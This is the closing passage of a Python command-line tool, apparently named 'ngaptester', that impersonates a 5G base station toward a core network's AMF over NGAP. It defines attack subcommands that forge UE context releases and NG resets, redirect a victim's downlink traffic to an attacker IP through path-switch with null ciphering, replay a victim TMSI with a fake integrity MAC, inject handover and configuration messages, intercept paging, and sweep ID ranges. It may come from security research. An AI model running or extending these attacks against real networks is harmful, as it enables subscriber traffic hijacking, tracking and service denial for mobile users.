                       "pdu_sessions": list(sessions)})

    listen_s = float(getattr(a, "listen", 0.0) or 0.0)
    if listen_s <= 0:
        print("[chain] release handshake done (UE should be CM-IDLE / GMM-Registered)")
        return
    print(f"[chain] step4 listening {listen_s}s for PAGING "
          f"(trigger MT data or Namf N1N2MessageTransfer now)...")
    seen = {"n": 0}

    def on_msg(pdu):
        if ngap.message_type(pdu) == "Paging":
            info = decode.paging_info(pdu)
            seen["n"] += 1
            print(f"  [PAGING INTERCEPTED] 5G-S-TMSI={info.get('fiveg_s_tmsi')} "
                  f"TAIs={info.get('tais')}")
            _save(a.evidence, {"attack": "paging-intercept", "paging": info,
                               "via": "chain-ps-release"})

    gnb.listen(listen_s, on_msg)
    print(f"[chain] done ({seen['n']} PAGING intercepted)")


def main():
    p = argparse.ArgumentParser(prog="ngaptester")
    p.add_argument("--config", required=True)
    p.add_argument("--amf-addr")
    p.add_argument("--amf-port", type=int)
    p.add_argument("--evidence", help="append JSONL evidence records to this file")
    sub = p.add_subparsers(dest="cmd", required=True)

    sub.add_parser("ng-setup")
    sub.add_parser("sctp-ping")  # L4-only reachability probe (no NGAP/NG Setup)

    s = sub.add_parser("ue-release")
    s.add_argument("--amf-ue-id", type=int, required=True)
    s.add_argument("--ran-ue-id", type=int, default=1)

    s = sub.add_parser("error-indication")
    s.add_argument("--amf-ue-id", type=int, required=True)
    s.add_argument("--ran-ue-id", type=int, default=None)

    s = sub.add_parser("ng-reset")
    s.add_argument("--targets", required=True, help="amf:ran,amf:ran,...")

    s = sub.add_parser("path-switch")
    s.add_argument("--source-amf-ue-id", type=int, required=True,
                   help="victim's Source AMF-UE-NGAP-ID")
    s.add_argument("--ran-ue-id", type=int, default=99,
                   help="attacker-chosen local RAN-UE-NGAP-ID")
    s.add_argument("--pdu-sessions", default="1", help="victim PDU session ids, csv")
    s.add_argument("--attacker-ip", default="auto",
                   help="DL N3 endpoint to redirect to ('auto' = this container)")
    s.add_argument("--teid", type=lambda x: int(x, 0), default=1)
    s.add_argument("--seccap", default=None,
                   help="override asserted UESecurityCapabilities as 'nea,nia' "
                        "(16-bit hex, MSB=algo0); default NEA0/NIA0 (0x8000)")

    s = sub.add_parser("initial-ue")
    s.add_argument("--ran-ue-id", type=int, default=99,
                   help="attacker-chosen local RAN-UE-NGAP-ID (new NG context)")
    s.add_argument("--amf-set-id", type=lambda x: int(x, 0), required=True,
                   help="AMF Set ID (10-bit) from victim 5G-S-TMSI / GUTI")
    s.add_argument("--amf-pointer", type=lambda x: int(x, 0), default=0,
                   help="AMF Pointer (6-bit)")
    s.add_argument("--tmsi", required=True,
                   help="victim 5G-TMSI as 8-hex or decimal")
    s.add_argument("--nas-hex", default=None,
                   help="override NAS-PDU hex (default: full plain Service Request)")
    s.add_argument("--nas-integrity", action="store_true",
                   help="wrap Service Request as integrity-protected with fake MAC "
                        "(sec-hdr=1); needed to pass free5GC header check")
    s.add_argument("--no-ue-ctx-req", action="store_true",
                   help="omit UEContextRequest IE")

    s = sub.add_parser("chain-ps-release")

    s.add_argument("--source-amf-ue-id", type=int, required=True,
                   help="victim's Source AMF-UE-NGAP-ID")
    s.add_argument("--ran-ue-id", type=int, default=99,
                   help="attacker RAN-UE-NGAP-ID, re-used for BOTH steps")
    s.add_argument("--pdu-sessions", default="1")
    s.add_argument("--attacker-ip", default="auto")
    s.add_argument("--teid", type=lambda x: int(x, 0), default=1)
    s.add_argument("--seccap", default=None)
    s.add_argument("--gap", type=float, default=1.0,
                   help="seconds between the path-switch and the release")
    s.add_argument("--release-wait", type=float, default=5.0,
                   help="seconds to wait for UEContextReleaseCommand")
    s.add_argument("--listen", type=float, default=0.0,
                   help="after Complete, seconds to listen for PAGING "
                        "(0 = exit after handshake)")

    s = sub.add_parser("chain-initue-release",
                       help="InitialUE (5G-S-TMSI) THEN UEContextRelease on one SCTP")
    s.add_argument("--ran-ue-id", type=int, default=99,
                   help="attacker-chosen RAN-UE-NGAP-ID for InitialUE + Release")
    s.add_argument("--amf-set-id", type=lambda x: int(x, 0), required=True,
                   help="AMF Set ID (10-bit) from victim 5G-S-TMSI / GUTI")
    s.add_argument("--amf-pointer", type=lambda x: int(x, 0), default=0,
                   help="AMF Pointer (6-bit)")
    s.add_argument("--tmsi", required=True,
                   help="victim 5G-TMSI as 8-hex or decimal")
    s.add_argument("--victim-amf-ue-id", type=int, default=None,
                   help="pre-attack serving AMF-UE-NGAP-ID (for victim-target release)")
    s.add_argument("--release-target", choices=("victim", "learned", "both"),
                   default=None,
                   help="which AU to release after InitialUE "
                        "(default: both if --victim-amf-ue-id else learned)")
    s.add_argument("--nas-hex", default=None,
                   help="override NAS-PDU hex (default: full plain Service Request)")
    s.add_argument("--nas-integrity", action="store_true",
                   help="wrap Service Request as integrity-protected with fake MAC")
    s.add_argument("--no-ue-ctx-req", action="store_true",
                   help="omit UEContextRequest IE on InitialUE")
    s.add_argument("--pdu-sessions", default="1",
                   help="PDU session ids on Release Request/Complete")
    s.add_argument("--initue-listen", type=float, default=3.0,
                   help="seconds to listen for DL exposing the new AU after InitialUE")
    s.add_argument("--gap", type=float, default=0.5,
                   help="seconds between InitialUE listen and each Release")
    s.add_argument("--release-wait", type=float, default=5.0,
                   help="seconds to wait for UEContextReleaseCommand per target")

    s = sub.add_parser("gtpu-sink")
    s.add_argument("--bind-ip", default="0.0.0.0")
    s.add_argument("--port", type=int, default=2152)
    s.add_argument("--duration", type=float, default=None,
                   help="seconds to listen (default: until interrupted)")

    s = sub.add_parser("handover-required")
    s.add_argument("--amf-ue-id", type=int, required=True)
    s.add_argument("--ran-ue-id", type=int, default=99)
    s.add_argument("--target-gnb-id", type=lambda x: int(x, 0), default=0xABCDE)

    s = sub.add_parser("ho-window-inject")
    s.add_argument("--amf-ue-id", type=int, required=True,
                   help="victim *source* AMF-UE-NGAP-ID (currently served UE)")
    s.add_argument("--ran-ue-id", type=int, default=99,
                   help="attacker-chosen RAN-UE-NGAP-ID claimed in HO Request Ack / p09")
    s.add_argument("--target-gnb-id", type=lambda x: int(x, 0), default=None,
                   help="TargetID gNB-id (default: this FakeGNB's cfg gnb_id)")
    s.add_argument("--mode", choices=["p21", "p09", "both"], default="both",
                   help="which HO-gated inject(s) to fire after preparation")
    s.add_argument("--pdu-sessions", default="1")
    s.add_argument("--attacker-ip", default="auto")
    s.add_argument("--teid", type=lambda x: int(x, 0), default=1)
    s.add_argument("--wait", type=float, default=8.0,
                   help="seconds to wait for HandoverRequest after Required")
    s.add_argument("--gap", type=float, default=0.5,
                   help="seconds between Ack / p21 / p09")
    s.add_argument("--listen", type=float, default=5.0,
                   help="seconds to listen for DownlinkRANStatusTransfer etc.")

    for name in ("pdu-notify", "handover-notify", "ul-nrppa", "ul-ran-status"):
        s = sub.add_parser(name)
        s.add_argument("--amf-ue-id", type=int, required=True)
        s.add_argument("--ran-ue-id", type=int, default=99)

    s = sub.add_parser("cell-trace")
    s.add_argument("--amf-ue-id", type=int, required=True)
    s.add_argument("--ran-ue-id", type=int, default=99)
    s.add_argument("--attacker-ip", default="auto")

    s = sub.add_parser("ran-config-update")
    s.add_argument("--tac", type=lambda x: int(x, 0), default=None,
                   help="victim TAC to claim (default: cfg tac)")
    s.add_argument("--listen", type=float, default=30.0,
                   help="seconds to listen for intercepted PAGING")

    s = sub.add_parser("ul-ran-config-transfer")
    s.add_argument("--target-gnb-id", type=lambda x: int(x, 0), required=True,
                   help="victim gNB-id to inject SON/Xn config toward")
    s.add_argument("--source-gnb-id", type=lambda x: int(x, 0), default=None)

    s = sub.add_parser("sweep")
    s.add_argument("--attack", required=True,
                   choices=["error-indication", "ue-release", "ng-reset", "path-switch"])
    s.add_argument("--amf-range", required=True, help="LO-HI")
    s.add_argument("--ran-ue-id", type=int, default=99)
    s.add_argument("--delay", type=float, default=0.05)
    s.add_argument("--pdu-sessions", default="1")
    s.add_argument("--attacker-ip", default="auto")
    s.add_argument("--teid", type=lambda x: int(x, 0), default=1)
    s.add_argument("--seccap", default=None, help="see path-switch --seccap")

    args = p.parse_args()
    args.evidence = getattr(args, "evidence", None)

    # gtpu-sink is a pure receiver: no AMF association, no NG Setup.
    if args.cmd == "gtpu-sink":
        cmd_gtpu_sink(args)
        return

    cfg = load_cfg(args.config, {"amf_addr": args.amf_addr, "amf_port": args.amf_port})

    # sctp-ping is a pure L4 probe: establish the SCTP association only, no NGAP.
    if args.cmd == "sctp-ping":
        cmd_sctp_ping(cfg)
        return

    gnb = FakeGNB(cfg)
    gnb.connect()
    print(f"[SCTP] connected to AMF {cfg['amf_addr']}:{cfg.get('amf_port', 38412)}")

    # carry the global --evidence onto every subcommand namespace
    args.evidence = getattr(args, "evidence", None)

    if args.cmd == "ng-setup":
        ok = do_ng_setup(gnb)
        gnb.close()
        sys.exit(0 if ok else 2)

    # all attack commands need an accepted NG Setup first
    if not do_ng_setup(gnb):
        print("NG Setup rejected; aborting.")
        gnb.close()
        sys.exit(2)

    {"ue-release": cmd_ue_release,
     "error-indication": cmd_error_indication,
     "ng-reset": cmd_ng_reset,
     "path-switch": cmd_path_switch,
     "handover-required": cmd_handover_required,
     "ho-window-inject": cmd_ho_window_inject,
     "pdu-notify": cmd_pdu_notify,
     "handover-notify": cmd_handover_notify,
     "ul-nrppa": cmd_nrppa,
     "cell-trace": cmd_cell_trace,
     "ul-ran-status": cmd_ran_status,
     "ran-config-update": cmd_ran_config_update,
     "ul-ran-config-transfer": cmd_ul_ran_config_transfer,
     "chain-ps-release": cmd_chain_ps_release,
     "chain-initue-release": cmd_chain_initue_release,
     "initial-ue": cmd_initial_ue,
     "sweep": cmd_sweep}[args.cmd](gnb, args)
    gnb.close()


if __name__ == "__main__":
    main()
